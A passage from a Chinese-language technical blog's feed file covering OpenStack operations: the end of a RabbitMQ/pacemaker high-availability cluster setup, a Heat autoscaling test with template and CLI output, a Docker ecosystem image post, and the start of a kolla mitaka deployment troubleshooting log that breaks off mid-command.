openstack <span class="string">&quot;.*&quot;</span> <span class="string">&quot;.*&quot;</span> <span class="string">&quot;.*&quot;</span></span><br></pre></td></tr></table></figure></li><li>为脚本增加执行权限<figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line"># chmod <span class="number">755</span> <span class="regexp">/usr/</span>local<span class="regexp">/sbin/</span>set_rabbitmq_policy</span><br></pre></td></tr></table></figure></li><li>创建 rabbitmq 高可用集群<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="comment"># pcs resource create --force --master rabbitmq-cluster ocf:rabbitmq:rabbitmq-server-ha \</span></span><br><span class="line">    <span class="attribute">erlang_cookie</span>=DPMDALGUKEOMPTHWPYKC <span class="attribute">node_port</span>=5672 \</span><br><span class="line">    op monitor <span class="attribute">interval</span>=30 <span class="attribute">timeout</span>=120 \</span><br><span class="line">    op monitor <span class="attribute">interval</span>=27 <span class="attribute">role</span>=Master <span class="attribute">timeout</span>=120 \</span><br><span class="line">    op monitor <span class="attribute">interval</span>=30 <span class="attribute">role</span>=Slave <span class="attribute">timeout</span>=120 <span class="attribute">OCF_CHECK_LEVEL</span>=30 \</span><br><span class="line">    op start <span class="attribute">interval</span>=0 <span class="attribute">timeout</span>=360 \</span><br><span class="line">    op stop <span class="attribute">interval</span>=0 <span class="attribute">timeout</span>=120 \</span><br><span class="line">    op promote <span class="attribute">interval</span>=0 <span class="attribute">timeout</span>=120 \</span><br><span class="line">    op demote <span class="attribute">interval</span>=0 <span class="attribute">timeout</span>=120 \</span><br><span class="line">    op notify <span class="attribute">interval</span>=0 <span class="attribute">timeout</span>=180 \</span><br><span class="line">    meta <span class="attribute">notify</span>=<span class="literal">true</span> <span class="attribute">ordered</span>=<span class="literal">false</span> <span class="attribute">interleave</span>=<span class="literal">false</span> <span class="attribute">master-max</span>=1 <span class="attribute">master-node-max</span>=1</span><br></pre></td></tr></table></figure><h3 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h3></li></ul><ol><li>确认集群状态<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line"><span class="comment"># rabbitmqctl cluster_status</span></span><br><span class="line">Cluster status of node rabbit@controller01 ...</span><br><span class="line">[&#123;nodes,[&#123;disc,[rabbit@controller01]&#125;,</span><br><span class="line">&#123;ram,[rabbit@controller03,rabbit@controller02]&#125;]&#125;,</span><br><span class="line">&#123;running_nodes,[rabbit@controller02,rabbit@controller03,rabbit@controller01]&#125;,</span><br><span class="line">&#123;cluster_name,&lt;&lt;<span class="string">&quot;rabbit@controller01&quot;</span>&gt;&gt;&#125;,</span><br><span class="line">&#123;partitions,[]&#125;,</span><br><span class="line">&#123;alarms,[&#123;rabbit@controller02,[]&#125;,</span><br><span class="line">&#123;rabbit@controller03,[]&#125;,</span><br><span class="line">&#123;rabbit@controller01,[]&#125;]&#125;]</span><br></pre></td></tr></table></figure></li><li>确认高可用状态<figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># pcs resource </span></span><br><span class="line"> vip(<span class="meta">ocf::heartbeat:IPaddr2</span>):<span class="literal">Started</span> controller01</span><br><span class="line"> <span class="keyword">Clone</span> <span class="title">Set</span>: haproxy-<span class="keyword">clone</span> <span class="title">[haproxy</span>]</span><br><span class="line">     <span class="literal">Started</span>: [ controller01 controller02 controller03 ]</span><br><span class="line"> <span class="keyword">Clone</span> <span class="title">Set</span>: memcached-<span class="keyword">clone</span> <span class="title">[memcached</span>]</span><br><span class="line">     <span class="literal">Started</span>: [ controller01 controller02 controller03 ]</span><br><span class="line"> <span class="literal">Master</span>/<span class="literal">Slave</span> Set: rabbitmq-cluster-<span class="keyword">master</span> <span class="title">[rabbitmq-cluster</span>]</span><br><span class="line">     Masters: [ controller03 ]</span><br><span class="line">     Slaves: [ controller01 controller02 ]</span><br></pre></td></tr></table></figure></li><li>确认 rabbitmq 集群策略<figure class="highlight gams"><table><tr><td class="code"><pre><span class="line"># rabbitmqctl  list_policies</span><br><span class="line"><span class="function"><span class="title">Listing</span></span> policies ...</span><br><span class="line">/ha-<span class="keyword">all</span><span class="keyword">all</span>.&#123;<span class="string">&quot;ha-mode&quot;</span>:<span class="string">&quot;all&quot;</span>,<span class="string">&quot;ha-sync-mode&quot;</span>:<span class="string">&quot;automatic&quot;</span>&#125;<span class="number">0</span></span><br></pre></td></tr></table></figure></li><li>确认 rabbitmq 用户是否正确创建<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="comment"># rabbitmqctl list_users</span></span><br><span class="line"><span class="attribute">Listing</span> users ...</span><br><span class="line"><span class="attribute">openstack</span><span class="meta">[]</span></span><br><span class="line"><span class="attribute">guest</span><span class="meta">[administrator]</span></span><br></pre></td></tr></table></figure></li><li>确认 openstack 用户访问权限<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line"><span class="comment"># rabbitmqctl list_permissions </span></span><br><span class="line">Listing permissions in vhost <span class="string">&quot;/&quot;</span> <span class="string">...</span></span><br><span class="line">guest.*.*.*</span><br><span class="line">openstack.*.*.*</span><br></pre></td></tr></table></figure></li></ol>]]></content>
      
      
      <categories>
          
          <category> openstack </category>
          
      </categories>
      
      
        <tags>
            
            <tag> rabbitmq </tag>
            
            <tag> pacemaker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OpenStack 二层网络模式下弹性伸缩测试</title>
      <link href="openstack/openstack-autoscalin.html"/>
      <url>openstack/openstack-autoscalin.html</url>
      
        <content type="html"><![CDATA[<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>操作系统：CentOS Linux release 7.5.1804 (Core)<br>OpenStack版本：OpenStack Ocata Allinone<br>注意事项：packstack安装时开启 heat-cfn,gnocchi,aodh,panko等   </p><span id="more"></span><h1 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h1><h2 id="环境修改"><a href="#环境修改" class="headerlink" title="环境修改"></a>环境修改</h2><p>修改 OpenStack 为二层模式，修改方法这里不在赘述。</p><h2 id="过程描述"><a href="#过程描述" class="headerlink" title="过程描述"></a>过程描述</h2><p><img data-src="/images/uploads/2018/10/liucheng.png" alt="流程图"></p><h2 id="测试步骤"><a href="#测试步骤" class="headerlink" title="测试步骤"></a>测试步骤</h2><h3 id="创建-Stack"><a href="#创建-Stack" class="headerlink" title="创建 Stack"></a>创建 Stack</h3><p>使用以下模版创建 Stack</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">heat_template_version:</span> <span class="number">2016-10-14</span></span><br><span class="line"><span class="attr">description:</span> <span class="string">Example</span> <span class="string">auto</span> <span class="string">scale</span> <span class="string">group,</span> <span class="string">policy</span> <span class="string">and</span> <span class="string">alarm</span></span><br><span class="line"><span class="attr">resources:</span></span><br><span class="line">  <span class="attr">scaleup_group:</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">OS::Heat::AutoScalingGroup</span></span><br><span class="line">    <span class="attr">properties:</span></span><br><span class="line">      <span class="attr">cooldown:</span> <span class="number">300</span></span><br><span class="line">      <span class="attr">desired_capacity:</span> <span class="number">1</span></span><br><span class="line">      <span class="attr">max_size:</span> <span class="number">3</span></span><br><span class="line">      <span class="attr">min_size:</span> <span class="number">1</span></span><br><span class="line">      <span class="attr">resource:</span></span><br><span class="line">        <span class="attr">type:</span> <span class="string">OS::Nova::Server</span></span><br><span class="line">        <span class="attr">properties:</span></span><br><span class="line">          <span class="attr">image:</span> <span class="string">&#x27;xenial-server-cloudimg-amd64&#x27;</span></span><br><span class="line">          <span class="attr">metadata:</span> &#123;<span class="attr">&quot;metering.server_group&quot;:</span> &#123;<span class="attr">get_param:</span> <span class="string">&quot;OS::stack_id&quot;</span>&#125;&#125;</span><br><span class="line">          <span class="attr">flavor:</span> <span class="string">m1.small</span></span><br><span class="line">          <span class="attr">networks:</span></span><br><span class="line">            <span class="bullet">-</span> <span class="attr">network:</span> <span class="string">net0</span></span><br><span class="line">            </span><br><span class="line">  <span class="attr">scaleup_policy:</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">OS::Heat::ScalingPolicy</span></span><br><span class="line">    <span class="attr">properties:</span></span><br><span class="line">      <span class="attr">adjustment_type:</span> <span class="string">change_in_capacity</span></span><br><span class="line">      <span class="attr">auto_scaling_group_id:</span> &#123; <span class="attr">get_resource:</span> <span class="string">scaleup_group</span> &#125;</span><br><span class="line">      <span class="attr">cooldown:</span> <span class="number">300</span></span><br><span class="line">      <span class="attr">scaling_adjustment:</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">scaledown_policy:</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">OS::Heat::ScalingPolicy</span></span><br><span class="line">    <span class="attr">properties:</span></span><br><span class="line">      <span class="attr">adjustment_type:</span> <span class="string">change_in_capacity</span></span><br><span class="line">      <span class="attr">auto_scaling_group_id:</span> &#123; <span class="attr">get_resource:</span> <span class="string">scaleup_group</span> &#125;</span><br><span class="line">      <span class="attr">cooldown:</span> <span class="number">300</span></span><br><span class="line">      <span class="attr">scaling_adjustment:</span> <span class="number">-1</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">cpu_alarm_high:</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">OS::Aodh::GnocchiAggregationByResourcesAlarm</span></span><br><span class="line">    <span class="attr">properties:</span></span><br><span class="line">      <span class="attr">description:</span> <span class="string">Scale</span> <span class="string">up</span> <span class="string">if</span> <span class="string">CPU</span> <span class="string">&gt;</span> <span class="number">80</span><span class="string">%</span></span><br><span class="line">      <span class="attr">metric:</span> <span class="string">cpu_util</span></span><br><span class="line">      <span class="attr">aggregation_method:</span> <span class="string">mean</span></span><br><span class="line">      <span class="attr">granularity:</span> <span class="number">300</span></span><br><span class="line">      <span class="attr">evaluation_periods:</span> <span class="number">1</span></span><br><span class="line">      <span class="attr">threshold:</span> <span class="number">80</span></span><br><span class="line">      <span class="attr">resource_type:</span> <span class="string">instance</span></span><br><span class="line">      <span class="attr">comparison_operator:</span> <span class="string">gt</span></span><br><span class="line">      <span class="attr">alarm_actions:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">str_replace:</span></span><br><span class="line">            <span class="attr">template:</span> <span class="string">trust+url</span></span><br><span class="line">            <span class="attr">params:</span></span><br><span class="line">              <span class="attr">url:</span> &#123;<span class="attr">get_attr:</span> [<span class="string">scaleup_policy</span>, <span class="string">signal_url</span>]&#125;</span><br><span class="line">      <span class="attr">query:</span></span><br><span class="line">        <span class="attr">str_replace:</span></span><br><span class="line">          <span class="attr">template:</span> <span class="string">&#x27;&#123;&quot;=&quot;: &#123;&quot;server_group&quot;: &quot;stack_id&quot;&#125;&#125;&#x27;</span></span><br><span class="line">          <span class="attr">params:</span></span><br><span class="line">            <span class="attr">stack_id:</span> &#123;<span class="attr">get_param:</span> <span class="string">&quot;OS::stack_id&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">  <span class="attr">cpu_alarm_low:</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">OS::Aodh::GnocchiAggregationByResourcesAlarm</span></span><br><span class="line">    <span class="attr">properties:</span></span><br><span class="line">      <span class="attr">metric:</span> <span class="string">cpu_util</span></span><br><span class="line">      <span class="attr">aggregation_method:</span> <span class="string">mean</span></span><br><span class="line">      <span class="attr">granularity:</span> <span class="number">300</span></span><br><span class="line">      <span class="attr">evaluation_periods:</span> <span class="number">1</span></span><br><span class="line">      <span class="attr">threshold:</span> <span class="number">10</span></span><br><span class="line">      <span class="attr">resource_type:</span> <span class="string">instance</span></span><br><span class="line">      <span class="attr">comparison_operator:</span> <span class="string">lt</span></span><br><span class="line">      <span class="attr">alarm_actions:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">str_replace:</span></span><br><span class="line">            <span class="attr">template:</span> <span class="string">trust+url</span></span><br><span class="line">            <span class="attr">params:</span></span><br><span class="line">              <span class="attr">url:</span> &#123;<span class="attr">get_attr:</span> [<span class="string">scaledown_policy</span>, <span class="string">signal_url</span>]&#125;</span><br><span class="line">      <span class="attr">query:</span></span><br><span class="line">        <span class="attr">str_replace:</span></span><br><span class="line">          <span class="attr">template:</span> <span class="string">&#x27;&#123;&quot;=&quot;: &#123;&quot;server_group&quot;: &quot;stack_id&quot;&#125;&#125;&#x27;</span></span><br><span class="line">          <span class="attr">params:</span></span><br><span class="line">            <span class="attr">stack_id:</span> &#123;<span class="attr">get_param:</span> <span class="string">&quot;OS::stack_id&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="attr">outputs:</span></span><br><span class="line">  <span class="attr">scaleup_policy_signal_url:</span></span><br><span class="line">    <span class="attr">value:</span> &#123;<span class="attr">get_attr:</span> [<span class="string">scaleup_policy</span>, <span class="string">signal_url</span>]&#125;</span><br><span class="line"></span><br><span class="line">  <span class="attr">scaledown_policy_signal_url:</span></span><br><span class="line">    <span class="attr">value:</span> &#123;<span class="attr">get_attr:</span> [<span class="string">scaledown_policy</span>, <span class="string">signal_url</span>]&#125;</span><br></pre></td></tr></table></figure><p>模版定义两个告警和伸缩策略，当 CPU 使用率在 300s 内大于 80% 则发出告警，heat 接收到告警开始创建新的虚拟机，最多 3 台。当 CPU 使用率在 300s 内小于 10% 则发出告警，heat 接收到告警开始删除虚拟机，最少保留 1 台。</p><h3 id="查看创建的-stack-、alarm-和虚拟机"><a href="#查看创建的-stack-、alarm-和虚拟机" class="headerlink" title="查看创建的 stack 、alarm 和虚拟机"></a>查看创建的 stack 、alarm 和虚拟机</h3><figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line">~ openstack stack list</span><br><span class="line"><span class="code">+--------------------------------------+</span>-------------<span class="code">+-----------------+</span>----------------------<span class="code">+--------------+</span></span><br><span class="line">| ID                                   | Stack Name  | Stack Status    | Creation Time        | Updated Time |</span><br><span class="line"><span class="code">+--------------------------------------+</span>-------------<span class="code">+-----------------+</span>----------------------<span class="code">+--------------+</span></span><br><span class="line">| af75c5e5-35c6-4ab3-b899-e4d9afbbcd74 | autoscaling | CREATE_COMPLETE | 2018-10-19T03:32:29Z | None         |</span><br><span class="line"><span class="code">+--------------------------------------+</span>-------------<span class="code">+-----------------+</span>----------------------<span class="code">+--------------+</span></span><br><span class="line"></span><br><span class="line">➜  ~ openstack alarm list</span><br><span class="line"><span class="code">+--------------------------------------+</span>--------------------------------------------<span class="code">+-----------------------------------------+</span>-------<span class="code">+----------+</span>---------+</span><br><span class="line">| alarm_id                             | type                                       | name                                    | state | severity | enabled |</span><br><span class="line"><span class="code">+--------------------------------------+</span>--------------------------------------------<span class="code">+-----------------------------------------+</span>-------<span class="code">+----------+</span>---------+</span><br><span class="line">| 6dfded8c-21a9-4792-a21c-eebc421e8706 | gnocchi_aggregation_by_resources_threshold | autoscaling-cpu_alarm_low-4e2ptwvvhbjq  | alarm | low      | True    |</span><br><span class="line">| 2eaa8f6c-3ec5-43ca-8c19-81470c0686a8 | gnocchi_aggregation_by_resources_threshold | autoscaling-cpu_alarm_high-2t4zh5stxmt7 | ok    | low      | True    |</span><br><span class="line"><span class="code">+--------------------------------------+</span>--------------------------------------------<span class="code">+-----------------------------------------+</span>-------<span class="code">+----------+</span>---------+</span><br><span class="line"></span><br><span class="line">~ openstack server list</span><br><span class="line"><span class="code">+--------------------------------------+</span>-------------------------------------------------------<span class="code">+--------+</span>----------------<span class="code">+------------------------------+</span></span><br><span class="line">| ID                                   | Name                                                  | Status | Networks       | Image Name                   |</span><br><span class="line"><span class="code">+--------------------------------------+</span>-------------------------------------------------------<span class="code">+--------+</span>----------------<span class="code">+------------------------------+</span></span><br><span class="line">| 3d723c6d-6c3e-41ba-a906-ded508f5006a | au-aleup_group-glnobyldea74-jnbifnyzqpr7-vghtyrjmru5u | ACTIVE | net0=10.0.1.6  | xenial-server-cloudimg-amd64 |</span><br><span class="line"><span class="code">+--------------------------------------+</span>-------------------------------------------------------<span class="code">+--------+</span>----------------<span class="code">+------------------------------+</span></span><br></pre></td></tr></table></figure><h3 id="自动创建测试"><a href="#自动创建测试" class="headerlink" title="自动创建测试"></a>自动创建测试</h3><h4 id="1-通过-stress-程序对虚拟机-CPU-进行压测"><a href="#1-通过-stress-程序对虚拟机-CPU-进行压测" class="headerlink" title="1. 通过 stress 程序对虚拟机 CPU 进行压测"></a>1. 通过 stress 程序对虚拟机 CPU 进行压测</h4><p>打开虚拟机控制台，运行以下命令进行 CPU 压测，持续 1200s</p><figure class="highlight brainfuck"><table><tr><td class="code"><pre><span class="line"><span class="comment">#</span> <span class="comment">stress</span> --<span class="comment">cpu</span> <span class="comment">1</span> --<span class="comment">timeout</span> <span class="comment">1200</span></span><br></pre></td></tr></table></figure><p><img data-src="/images/uploads/2018/10/CPU.png" alt="压力测试"></p><h4 id="2-查看虚拟机的-CPU-使用率"><a href="#2-查看虚拟机的-CPU-使用率" class="headerlink" title="2. 查看虚拟机的 CPU 使用率"></a>2. 查看虚拟机的 CPU 使用率</h4><p>使用以下命令查询虚拟机的 CPU 使用率</p><figure class="highlight gherkin"><table><tr><td class="code"><pre><span class="line">~ gnocchi measures show cpu_util --resource-id instance_uuid</span><br><span class="line"></span><br><span class="line">+---------------------------+-------------+----------------+</span><br><span class="line">|<span class="string"> timestamp                 </span>|<span class="string"> granularity </span>|<span class="string">          value </span>|</span><br><span class="line">+---------------------------+-------------+----------------+</span><br><span class="line">|<span class="string"> 2018-10-19T06:00:00+00:00 </span>|<span class="string">       300.0 </span>|<span class="string">  0.16605959835 </span>|</span><br><span class="line">|<span class="string"> 2018-10-19T06:05:00+00:00 </span>|<span class="string">       300.0 </span>|<span class="string"> 0.161092701601 </span>|</span><br><span class="line">|<span class="string"> 2018-10-19T06:10:00+00:00 </span>|<span class="string">       300.0 </span>|<span class="string"> 0.162481952842 </span>|</span><br><span class="line">|<span class="string"> 2018-10-19T06:15:00+00:00 </span>|<span class="string">       300.0 </span>|<span class="string"> 0.166559675456 </span>|</span><br><span class="line">|<span class="string"> 2018-10-19T06:20:00+00:00 </span>|<span class="string">       300.0 </span>|<span class="string"> 0.167608932622 </span>|</span><br><span class="line">|<span class="string"> 2018-10-19T06:25:00+00:00 </span>|<span class="string">       300.0 </span>|<span class="string"> 0.664303071272 </span>|</span><br><span class="line">|<span class="string"> 2018-10-19T06:30:00+00:00 </span>|<span class="string">       300.0 </span>|<span class="string"> 0.170293083241 </span>|</span><br><span class="line">|<span class="string"> 2018-10-19T06:35:00+00:00 </span>|<span class="string">       300.0 </span>|<span class="string">  63.2803744387 </span>|</span><br><span class="line">|<span class="string"> 2018-10-19T06:40:00+00:00 </span>|<span class="string">       300.0 </span>|<span class="string">  99.9796696522 </span>|</span><br><span class="line">+---------------------------+-------------+----------------+</span><br></pre></td></tr></table></figure><p>最后两条记录显示 CPU 占用率已经 &gt; 80% 了</p><h4 id="3-查看告警触发情况"><a href="#3-查看告警触发情况" class="headerlink" title="3. 查看告警触发情况"></a>3. 查看告警触发情况</h4><figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line"><span class="code"> ~ openstack alarm list                                                             </span></span><br><span class="line"><span class="code">+--------------------------------------+</span>--------------------------------------------<span class="code">+-----------------------------------------+</span>-------<span class="code">+----------+</span>---------+</span><br><span class="line">| alarm_id                             | type                                       | name                                    | state | severity | enabled |</span><br><span class="line"><span class="code">+--------------------------------------+</span>--------------------------------------------<span class="code">+-----------------------------------------+</span>-------<span class="code">+----------+</span>---------+</span><br><span class="line">| 6dfded8c-21a9-4792-a21c-eebc421e8706 | gnocchi_aggregation_by_resources_threshold | autoscaling-cpu_alarm_low-4e2ptwvvhbjq  | ok    | low      | True    |</span><br><span class="line">| 2eaa8f6c-3ec5-43ca-8c19-81470c0686a8 | gnocchi_aggregation_by_resources_threshold | autoscaling-cpu_alarm_high-2t4zh5stxmt7 | alarm | low      | True    |</span><br><span class="line"><span class="code">+--------------------------------------+</span>--------------------------------------------<span class="code">+-----------------------------------------+</span>-------<span class="code">+----------+</span>---------+</span><br></pre></td></tr></table></figure><p>可以看到 autoscaling-cpu_alarm_high-2t4zh5stxmt7 告警已经被触发</p><h4 id="4-查看虚拟机"><a href="#4-查看虚拟机" class="headerlink" title="4. 查看虚拟机"></a>4. 查看虚拟机</h4><p><img data-src="/images/uploads/2018/10/create.png" alt="自动创建"><br>可以看到自动创建了一台虚拟机</p><h3 id="自动删除测试"><a href="#自动删除测试" class="headerlink" title="自动删除测试"></a>自动删除测试</h3><h4 id="1-停止虚拟机压测程序"><a href="#1-停止虚拟机压测程序" class="headerlink" title="1. 停止虚拟机压测程序"></a>1. 停止虚拟机压测程序</h4><p>停止压测程序，等待 CPU 使用率降低下来</p><figure class="highlight gherkin"><table><tr><td class="code"><pre><span class="line">~ gnocchi measures show cpu_util --resource-id 578a14e4-1e00-4812-8039-81209f135116 </span><br><span class="line">+---------------------------+-------------+----------------+</span><br><span class="line">|<span class="string"> timestamp                 </span>|<span class="string"> granularity </span>|<span class="string">          value </span>|</span><br><span class="line">+---------------------------+-------------+----------------+</span><br><span class="line">|<span class="string"> 2018-10-19T06:00:00+00:00 </span>|<span class="string">       300.0 </span>|<span class="string">  0.16605959835 </span>|</span><br><span class="line">|<span class="string"> 2018-10-19T06:05:00+00:00 </span>|<span class="string">       300.0 </span>|<span class="string"> 0.161092701601 </span>|</span><br><span class="line">|<span class="string"> 2018-10-19T06:10:00+00:00 </span>|<span class="string">       300.0 </span>|<span class="string"> 0.162481952842 </span>|</span><br><span class="line">|<span class="string"> 2018-10-19T06:15:00+00:00 </span>|<span class="string">       300.0 </span>|<span class="string"> 0.166559675456 </span>|</span><br><span class="line">|<span class="string"> 2018-10-19T06:20:00+00:00 </span>|<span class="string">       300.0 </span>|<span class="string"> 0.167608932622 </span>|</span><br><span class="line">|<span class="string"> 2018-10-19T06:25:00+00:00 </span>|<span class="string">       300.0 </span>|<span class="string"> 0.664303071272 </span>|</span><br><span class="line">|<span class="string"> 2018-10-19T06:30:00+00:00 </span>|<span class="string">       300.0 </span>|<span class="string"> 0.170293083241 </span>|</span><br><span class="line">|<span class="string"> 2018-10-19T06:35:00+00:00 </span>|<span class="string">       300.0 </span>|<span class="string">  63.2803744387 </span>|</span><br><span class="line">|<span class="string"> 2018-10-19T06:40:00+00:00 </span>|<span class="string">       300.0 </span>|<span class="string">  94.3206761804 </span>|</span><br><span class="line">|<span class="string"> 2018-10-19T06:45:00+00:00 </span>|<span class="string">       300.0 </span>|<span class="string">  99.9847353387 </span>|</span><br><span class="line">|<span class="string"> 2018-10-19T06:50:00+00:00 </span>|<span class="string">       300.0 </span>|<span class="string">   99.984336257 </span>|</span><br><span class="line">|<span class="string"> 2018-10-19T06:55:00+00:00 </span>|<span class="string">       300.0 </span>|<span class="string">  30.1423223067 </span>|</span><br><span class="line">|<span class="string"> 2018-10-19T07:00:00+00:00 </span>|<span class="string">       300.0 </span>|<span class="string"> 0.163830348301 </span>|</span><br><span class="line">+---------------------------+-------------+----------------+</span><br></pre></td></tr></table></figure><p>可以看到 CPU 的使用率已经降了下来</p><h4 id="2-查看告警触发情况"><a href="#2-查看告警触发情况" class="headerlink" title="2. 查看告警触发情况"></a>2. 查看告警触发情况</h4><figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line">~ openstack alarm list                                                                         </span><br><span class="line"><span class="code">+--------------------------------------+</span>--------------------------------------------<span class="code">+-----------------------------------------+</span>-------<span class="code">+----------+</span>---------+</span><br><span class="line">| alarm_id                             | type                                       | name                                    | state | severity | enabled |</span><br><span class="line"><span class="code">+--------------------------------------+</span>--------------------------------------------<span class="code">+-----------------------------------------+</span>-------<span class="code">+----------+</span>---------+</span><br><span class="line">| 6dfded8c-21a9-4792-a21c-eebc421e8706 | gnocchi_aggregation_by_resources_threshold | autoscaling-cpu_alarm_low-4e2ptwvvhbjq  | alarm | low      | True    |</span><br><span class="line">| 2eaa8f6c-3ec5-43ca-8c19-81470c0686a8 | gnocchi_aggregation_by_resources_threshold | autoscaling-cpu_alarm_high-2t4zh5stxmt7 | ok    | low      | True    |</span><br><span class="line"><span class="code">+--------------------------------------+</span>--------------------------------------------<span class="code">+-----------------------------------------+</span>-------<span class="code">+----------+</span>---------+</span><br></pre></td></tr></table></figure><p>可以看到 autoscaling-cpu_alarm_low-4e2ptwvvhbjq 告警已经被触发</p><h4 id="3-查看虚拟机"><a href="#3-查看虚拟机" class="headerlink" title="3. 查看虚拟机"></a>3. 查看虚拟机</h4><p><img data-src="/images/uploads/2018/10/delete.png" alt="自动删除"><br>可以看到最早创建的一台虚拟机被自动删除了</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>本文只是最简单的测试，heat 还可以结合 lb 实现更强大的弹性伸缩功能，值得深入学习下。</p>]]></content>
      
      
      <categories>
          
          <category> openstack </category>
          
      </categories>
      
      
        <tags>
            
            <tag> heat </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>容器生态系统</title>
      <link href="docker/container-system.html"/>
      <url>docker/container-system.html</url>
      
        <content type="html"><![CDATA[<p>图片整理自《每天5分钟玩转Docker容器技术》</p><p><img data-src="/images/uploads/2018/09/container.png" alt="image"></p>]]></content>
      
      
      <categories>
          
          <category> docker </category>
          
      </categories>
      
      
        <tags>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kolla-mitaka-eol 部署openstack mitaka遇到的问题</title>
      <link href="openstack/kolla-mitaka-eol-deploy-openstack.html"/>
      <url>openstack/kolla-mitaka-eol-deploy-openstack.html</url>
      
        <content type="html"><![CDATA[<p>实验需要使用 kolla 部署 openstack mitaka环境，由于是两年前的版本，实验过程中遇到了一些坑，记录如下。</p><h1 id="系统环境"><a href="#系统环境" class="headerlink" title="系统环境"></a>系统环境</h1><p>操作系统：CentOS Linux release 7.2.1511 (Core)<br>内核版本：3.10.0-327.28.3.el7.x86_64<br>kolla版本：mitaka-eol<br>docker版本：Docker version 1.13.1, build 092cba3<br>docker镜像：官方tag 2.0.2 (对应 openstack mitaka版本)</p><h1 id="问题一-openvswitch-db-容器无法运行"><a href="#问题一-openvswitch-db-容器无法运行" class="headerlink" title="问题一: openvswitch_db 容器无法运行"></a>问题一: openvswitch_db 容器无法运行</h1><h2 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h2><p>kolla-ansible deploy 部署openstack的时候总会遇到 openvswitch_db service 无法启动的问题</p><figure class="highlight livescript"><table><tr><td class="code"><pre><span class="line">TASK: [neutron | Waiting the openvswitch_db service <span class="keyword">to</span> be ready] ************** </span><br><span class="line">failed: [localhost] =&gt; &#123;<span class="string">&quot;attempts&quot;</span>: <span class="number">30</span>, <span class="string">&quot;changed&quot;</span>: <span class="literal">false</span>, <span class="string">&quot;cmd&quot;</span>: [<span class="string">&quot;docker&quot;</span>, <span class="string">&quot;exec&quot;</span>, <span class="string">&quot;openvswitch_db&quot;</span>, <span class="string">&quot;ovs-vsctl&quot;</span>, <span class="string">&quot;--no-wait&quot;</span>, <span class="string">&quot;show&quot;</span>], <span class="string">&quot;delta&quot;</span>: <span class="string">&quot;0:00:00.032518&quot;</span>, <span class="string">&quot;end&quot;</span>: <span class="string">&quot;2018-07-09 07:33:12.680647&quot;</span>, <span class="string">&quot;failed&quot;</span>: <span class="literal">true</span>, <span class="string">&quot;rc&quot;</span>: <span class="number">1</span>, <span class="string">&quot;start&quot;</span>: <span class="string">&quot;2018-07-09 07:33:12.648129&quot;</span>, <span class="string">&quot;stdout_lines&quot;</span>: [], <span class="string">&quot;warnings&quot;</span>: []&#125;</span><br><span class="line">stderr: <span class="built_in">Error</span> response <span class="keyword">from</span> daemon: Container <span class="number">0cec</span>739aabe06805aa0e1624318ac052d9f8fb176078df3d20a13c4df304fa7a <span class="keyword">is</span> restarting, wait <span class="keyword">until</span> the container <span class="keyword">is</span> running</span><br><span class="line">msg: Task failed <span class="keyword">as</span> maximum retries was encountered</span><br><span class="line"></span><br><span class="line">FATAL: all hosts have already failed -- aborting</span><br></pre></td></tr></table></figure><p>查看容器日志有如下报错</p><figure class="highlight stata"><table><tr><td class="code"><pre><span class="line">INFO:__main__:Kolla config strategy <span class="keyword">set</span> to: COPY_ALWAYS</span><br><span class="line">INFO:__main__:Loading config <span class="keyword">file</span> at /<span class="keyword">var</span>/lib/kolla/config_files/config.json</span><br><span class="line">INFO:__main__:Validating config <span class="keyword">file</span></span><br><span class="line">INFO:__main__:Copying service configuration files</span><br><span class="line">INFO:__main__:Writing <span class="keyword">out</span> command to execute</span><br><span class="line">Running command: &#x27;/usr/sbin/ovsdb-server /<span class="keyword">var</span>/lib/openvswitch/<span class="keyword">conf</span>.<span class="keyword">db</span> -vconsole:emer -vsyslog:<span class="keyword">err</span> -vfile:info --remote=punix:/<span class="keyword">run</span>/openvswitch/<span class="keyword">db</span>.sock --<span class="keyword">log</span>-<span class="keyword">file</span>=/<span class="keyword">var</span>/<span class="keyword">log</span>/openvswitch/ovsdb-server.<span class="keyword">log</span>&#x27;</span><br><span class="line">ovsdb-server: I/O <span class="keyword">error</span>: <span class="keyword">open</span>: /<span class="keyword">var</span>/lib/openvswitch/<span class="keyword">conf</span>.<span class="keyword">db</span> failed (<span class="keyword">No</span> such <span class="keyword">file</span> or directory)</span><br></pre></td></tr></table></figure><span id="more"></span><h2 id="排查问题"><a href="#排查问题" class="headerlink" title="排查问题"></a>排查问题</h2><h3 id="1-手动创建-openvswitch-db-容器，并进入交互模式"><a href="#1-手动创建-openvswitch-db-容器，并进入交互模式" class="headerlink" title="1. 手动创建 openvswitch_db 容器，并进入交互模式"></a>1. 手动创建 openvswitch_db 容器，并进入交互模式</h3><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">docker</span> run -it 